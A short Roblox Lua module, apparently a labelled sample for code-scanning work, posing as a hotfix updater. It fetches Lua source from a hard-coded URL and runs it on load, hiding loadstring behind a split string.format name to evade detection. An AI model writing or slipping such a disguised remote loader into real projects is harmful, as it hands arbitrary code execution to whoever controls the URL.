
-- LOADS: loadstring is resolved as getfenv(0)[string.format("%s%s","load","string")], then runs a remotely fetched source string. Computed-key lookup + string.format split of "loadstring".
local Updater = {}
local HttpService = game:GetService("HttpService")

function Updater.applyHotfix(url)
	local env = getfenv(0)
	local fname = string.format("%s%s", "load", "string")
	local source = HttpService:GetAsync(url)
	local chunk = env[fname](source)
	if chunk then
		return chunk()
	end
end

return Updater.applyHotfix("https://cdn.example-games.net/live/hotfix.lua")
